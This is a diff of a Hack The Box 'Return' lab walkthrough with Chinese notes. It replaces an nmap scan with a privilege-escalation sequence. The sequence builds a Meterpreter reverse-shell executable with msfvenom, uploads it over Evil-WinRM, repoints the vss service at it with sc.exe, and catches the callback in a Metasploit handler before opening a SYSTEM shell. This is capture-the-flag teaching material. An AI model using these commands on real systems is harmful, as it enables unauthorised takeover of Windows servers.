@@ -1,38 +1,32 @@
 ## Return
+### 总结 Metasploit Framework（MSF） 是一个开源的 渗透测试与漏洞利用框架（penetration testing framework）
 ```
-[★]$ nmap -sC -sV 10.129.10.164
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-03 00:32 CST
-Nmap scan report for 10.129.10.164
-Host is up (0.013s latency).
-Not shown: 988 closed tcp ports (reset)
-PORT     STATE SERVICE       VERSION
-53/tcp   open  domain        Simple DNS Plus
-80/tcp   open  http          Microsoft IIS httpd 10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: HTB Printer Admin Panel
-88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-03 06:50:53Z)
-135/tcp  open  msrpc         Microsoft Windows RPC
-139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
-445/tcp  open  microsoft-ds?
-464/tcp  open  kpasswd5?
-593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  tcpwrapped
-3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
-3269/tcp open  tcpwrapped
-Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+Server Operators：可以用 sc.exe config 改服务路径
+[1]
+[★]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.93 LPORT=1337 -f exe > shell.exe
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload shell.exe
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config vss binPath="C:\Users\svc-printer\Documents\shell.exe"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop vss
+*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start vss
+[2]
+[★]$ msfconsole
+[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD => windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 10.10.14.93
+LHOST => 10.10.14.93
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 1337
+LPORT => 1337
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run
+[*] Started reverse TCP handler on 10.10.14.93:1337
 
-Host script results:
-| smb2-security-mode: 
-|   3:1:1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   date: 2026-02-03T06:50:59
-|_  start_date: N/A
-|_clock-skew: 18m27s
-
+(Meterpreter 3)(C:\Windows\system32) > ps
+(Meterpreter 4)(C:\Windows\system32) > migrate 332
+(Meterpreter 4)(C:\Windows\system32) > shell
+```
+```
 [★]$ ports=$(nmap -p- --min-rate=1000 -T4 10.129.10.164 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
 [★]$ nmap -p$ports -sV -sC 10.129.10.164
 PORT      STATE SERVICE       VERSION
@@ -461,11 +455,6 @@ Process 4228 created.
 Channel 1 created.
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
-
-C:\Windows\system32>whoamo
-whoamo
-'whoamo' is not recognized as an internal or external command,
-operable program or batch file.
 
 C:\Windows\system32>whoami
 whoami
